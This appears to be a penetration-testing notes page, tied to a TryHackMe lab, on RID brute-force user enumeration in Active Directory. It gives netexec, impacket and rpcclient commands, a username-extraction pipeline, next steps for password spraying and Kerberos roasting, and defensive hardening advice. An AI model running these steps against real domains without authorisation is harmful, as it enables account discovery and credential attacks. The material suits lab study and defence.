# RID Brute-Force Enumeration (LSA Cycling)

**Used on:** **SoupedeCode 01** (TryHackMe Easy)

When the domain blocks `enumdomusers` over SAMR but still answers `LookupSids` over LSARPC (the default for any authenticated principal — including `guest` on many lab / legacy configurations), iterating SIDs by RID walks out the full user list.

---

## Prerequisites

- A valid bind to SMB — guest / null / low-priv / any domain user.
- LSA on the DC (or any DC member) reachable on 445.

---

## Why It Works

Every AD principal has a SID of the form `S-1-5-21-<DOMAIN>-<RID>`. The RID space is enumerable:

| RID range | Purpose |
|-----------|---------|
| 500–519   | Built-in (Administrator 500, Guest 501, krbtgt 502) |
| 1000+     | Created domain principals (users / computers / groups) |

`lsaLookupSids` returns the name for a SID — even if SAMR is locked down. Tools cycle RIDs and resolve each SID against LSA.

---

## netexec (recommended)

```bash
nxc smb <TARGET> -u guest -p '' --rid-brute > rid_brute.txt
```

Default cycles RIDs 500–4000. Extend with `--rid-brute 10000` for larger domains.

### Filter to just user accounts
```bash
grep '<DOMAIN>\\' rid_brute.txt \
  | cut -d':' -f2- \
  | sed -E 's/.*<DOMAIN>\\(.*) \(SidType.*/\1/' \
  | grep -v '\$' \
  > usernames.txt
```

`grep -v '\$'` drops computer accounts, which end in `$`. Include them (`grep '\$'`) if you want the machine-account list for PTH / RBCD planning.

---

## Impacket Alternative

```bash
impacket-lookupsid <DOMAIN>/guest:''@<TARGET>
impacket-lookupsid <DOMAIN>/<USER>:<PASS>@<TARGET> 4000
```

Second form sets the max RID.

---

## rpcclient Manual Path

When scripted tools are blocked:

```bash
rpcclient -U 'guest%' //<TARGET>
rpcclient $> lookupnames administrator    # yields the domain SID
rpcclient $> lookupsids S-1-5-21-...-1000
rpcclient $> lookupsids S-1-5-21-...-1001
...
```

---

## What to Do With the Output

1. **AS-REP Roast** — feed `usernames.txt` to `impacket-GetNPUsers` for accounts with `DONT_REQ_PREAUTH`.
2. **Password Spraying** — test common policies (`Season+Year!`, `Welcome123`) and the "user == password" pattern via `nxc --no-brute`.
3. **Kerberoast prep** — once one valid account is found, run `GetUserSPNs` to pivot to service accounts.

See also:
- [Password spraying](password-spraying.md)
- [AS-REP Roast & Kerberoast](kerberos-roasting.md)
- [SMB anonymous enumeration](smb-anonymous-enum.md)

---

## Defensive Notes

1. **Disable the `Guest` account** and ensure `RestrictAnonymous = 2` + `RestrictAnonymousSAM = 1` (`HKLM\SYSTEM\CurrentControlSet\Control\Lsa`).
2. **Monitor LSA traffic volumes** — RID cycling generates distinctive bursts of `LookupSids` against sequential RIDs.
3. **Apply NTLM auditing.** Event 4624 / 4625 with logon type 3 from external IPs using `GUEST` or null usernames is a very high-signal alert.


